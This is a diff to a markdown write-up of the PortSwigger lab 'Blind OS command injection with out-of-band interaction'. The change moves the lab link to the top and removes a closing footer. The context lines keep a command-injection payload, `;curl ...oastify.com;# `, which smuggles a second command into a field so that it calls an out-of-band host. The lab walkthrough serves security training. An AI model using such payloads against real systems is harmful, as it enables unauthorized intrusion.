@@ -1,5 +1,7 @@
 # Blind OS command injection with out-of-band interaction
 
+**Lab URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
+
 ### Goal - 
 
 Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator
@@ -44,9 +46,3 @@ we successfully received 2 DNS lookups, which means the feedback function is ind
 `;curl bl0niom9dypwrc3t6yvw24d2htnkbazz.oastify.com;# `
 
 ![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/OS_Command_Injection/images/049eda6ceb9c_003.png)
-
-## PortSwigger Lab
-
-**Official lab:** Blind OS command injection with out-of-band interaction
-
-**PortSwigger:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
